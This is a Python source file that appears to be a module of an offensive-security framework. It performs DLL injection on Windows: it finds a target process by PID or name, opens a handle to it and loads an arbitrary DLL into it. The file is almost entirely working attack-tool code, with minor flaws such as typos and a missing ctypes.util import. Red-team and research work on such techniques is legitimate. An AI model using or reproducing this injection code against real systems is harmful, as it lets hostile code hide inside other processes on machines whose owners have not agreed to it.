import ctypes

import psutil
import sys

from mayhem.proc.windows import WindowsProcess
from module import Module

from platform import architecture


class BoomerModule(Module):

    process_handle = None
    pid = None
    dll = None
    dll_handle = None

    def __init__(self, options={}, info={}):
        if len(info) == 0:
            info = {
                "Name": "DLL Injection - CreateRemoteThread Method",
                "Author": "Antonio Marcos",
                "Description": "Inject a DLL into a process."
            }
        if len(options) == 0:
            options = {
                "pid": ["Target PID to inject dll", None, False],
                "process_name": ["Process name to inject dll", None, False],
                "dll": ["Absolute path to the DLL to inject", None, True]
            }

        if architecture()[0] == "64bit":
            self.print_info("Process and DLL to injec must be 64 bits")
        else:
            self.print_info("Process and DLL to injec must be 32 bits")
        super(BoomerModule, self).__init__(options, info)


    def run(self):
        validation_message = self.initial_validation()
        if validation_message is not None:
            self.print_error(validation_message)
            return

        # Setting pid variable
        self.pid_initialization()

        # Getfing dll path form options
        dll_path = self.options.get('dll')[1]

        # Injecting dll from the given path into the process with the given pid
        if not self.inject_dll(dll_path):
            return

        # Closing process handle
        self.close_process_handle()

    def pid_initialization(self):
        if self.options.get('pid')[1] == "" or self.options.get('pid')[1] == None:
            self.pid = self.get_pid_by_process_name(self.options.get('process_name')[1])
        else:
            self.pid = int(self.options.get('pid')[1])

    def inject_dll(self, dll_path):
        result = True
        if self.pid != None:
            # Getting process handler
            try:
                arch = self.get_arch()
                self.process_handle = WindowsProcess(pid=self.pid, arch=arch)
            except Exception as error:
                self.print_error("{0}".format(error.msg))
                return False

            self.print_info("Opened a handle to pid: {0}".format(self.pid))

            # Finding and injecting dll
            self.dll = ctypes.util.find_library(dll_path)
            if self.dll:
                self.print_info("Found DLL at: {0}".format(self.dll))
            else:
                self.print_error('Failed to find the DLL in the system')
                return False

            # Loading DLL into the process
            self.print_info('Loading DLL into the process...')
            try:
                self.dll_handle = self.process_handle.load_library(self.dll)
            except Exception as error:
                print("[-] {0}".format(error.msg))
                return False
            else:
                self.print_ok(
                    "Loaded {0} into process with pid {1} with handle 0x{2:08x}".format(self.dll, self.pid, self.dll_handle))

            return result

    def initial_validation(self):
        # Validate that there is an option set for pid and process_name
        if not self.input_validation():
            return "It's mandatory to specify a pid or a process name"

        # Validate that the platform where the module is running is Windows
        if not self.platform_validation():
            return "This module is only available on Windows"

    def platform_validation(self):
        result = True
        if not sys.platform.startswith('win'):
            result = False
        return result

    def input_validation(self):
        result = True
        option_pid = self.options.get("pid")[1]
        option_process_name = self.options.get("process_name")[1]
        if (option_pid == None or option_pid == "") and (option_process_name == None or option_process_name == ""):
            result = False
        return result

    def get_arch(self):
        return architecture()[0]

    def get_pid_by_process_name(self, process_name):
        pid = None
        for proc in psutil.process_iter():
            if proc.name() == process_name:
                pid = proc.pid
                break
        return pid

    def close_process_handle(self):
        self.process_handle.close()